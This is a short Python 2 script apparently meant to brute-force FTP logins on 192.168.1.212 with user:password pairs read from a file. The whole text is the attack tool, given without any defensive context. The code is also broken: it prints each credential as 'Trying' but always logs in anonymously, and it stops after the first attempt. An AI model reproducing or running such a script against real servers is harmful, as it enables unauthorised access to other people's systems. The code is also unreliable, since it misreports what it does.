import ftplib

def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print "[+] Trying: " + userName + ":" + passWord

        try:
            ftp = ftplib.FTP(hostname)
            ftp.login('anonymous', 'me@your.com')
            print '\n[*] ' + str(hostname) + ' FTP Anonymous login succeeded.'
            ftp.quit()
            return True
        except Exception, e:
            print '\n[-] ' + str(hostname) + ' FTP Anonymous login failed.'
            return False

host = '192.168.1.212'
passwdFile = 'userpass.txt'
bruteLogin(host, passwdFile)
